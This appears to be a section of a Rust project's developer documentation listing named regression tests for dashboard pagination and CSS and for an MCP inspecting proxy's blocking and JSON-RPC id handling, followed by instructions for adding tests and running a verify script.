- `crates/agent/src/dashboard/mod.rs::tests::pr_h_audit_trail_uses_page_numbers_not_load_more` — compliance.js exposes `AUDIT_PAGE_SIZES = [10, 50, 100]`, `pageSize: 10` default, `setAuditPage`, `setAuditPageSize`, `renderAuditPaginationBar`. Legacy "Load 50 more" button + `fetchAuditTrailPage(false)` accumulator call site stay deleted.
- `crates/agent/src/dashboard/mod.rs::tests::pr_h_pagination_css_is_shared_across_intel_and_audit` — `.pagination-bar` / `.pagination-status` / `.pagination-pagesize` / `.pagination-nav` / `.pagination-btn` (+ `-active` / `-disabled`) / `.pagination-ellipsis` defined in app.css. Single CSS surface backs both views — a fork that styles them separately fails this anchor.
- `crates/agent/src/dashboard/mod.rs::tests::pr_h_no_spec_leaks_in_operator_facing_strings` — operator-facing strings must not surface internal spec numbers. `· spec 024 ·` (Metrics Drift subtitle) and `(spec 016)` (SQLite Operational Health tooltip) stay deleted.

### MCP inspecting proxy (2026-06-05)

The proxy wraps a real MCP server and inspects JSON-RPC traffic. These anchors pin the load-bearing safety + correctness invariants: the default must never block (enabling the proxy can't break existing MCP flows), a blocked call must reply with the original id (no client hang), and the JSON-RPC id must round-trip losslessly.

- `crates/agent-guard/src/mcp_proxy/enforce.rs::tests::advisory_and_warn_modes_never_block` — the DEFAULT (`advisory`) and `warn` modes forward+alert a blocking verdict but NEVER block/kill. This is the no-regression contract: turning the proxy on at its default changes no observable MCP behavior. A future refactor that lets advisory block fails here.
- `crates/agent-guard/src/mcp_proxy/enforce.rs::tests::guard_blocks_a_disallowed_tool_call` — `guard` mode synthesizes a denial for a disallowed `tools/call`, echoing the original request id as an `isError` result (the call is not forwarded). A blocked request is never silently dropped (which would hang the client).
- `crates/agent-guard/src/mcp_proxy/jsonrpc.rs::tests::large_integer_id_round_trips_losslessly` — a request id is preserved verbatim through parse→serialize (no `1` vs `1.0` / big-int precision loss), so a synthesized denial correlates to the right request.
- `crates/agent-guard/src/mcp_proxy/transport.rs::tests::guard_blocks_and_replies_with_denial` — end-to-end: in `guard` mode a credential-laden `tools/call` never reaches the wrapped server and the client receives the denial; the clean call passes through.

## Adding a new anchor

When fixing a bug that fits any of these shapes, add the anchor here in the same PR:

- The bug recurred (operator reported it twice).
- The bug is a class, not an instance (drift between two surfaces, stale state crossing a boundary, counter-as-gauge confusion, etc.).
- The fix is structural (new helper, new invariant, new contract) rather than a pointed code change.

Format the entry consistent with the existing ones. Keep the description to one sentence. Reference the historical bug (date or PR number) in the description so a future reader understands the cost of the test.

## Running the verify script

```bash
./scripts/verify-anchor-tests.sh
```

Greps the source tree for every named test in this file. Exits non-zero if any are missing. CI runs this on every PR via `.github/workflows/anchor-tests.yml`.
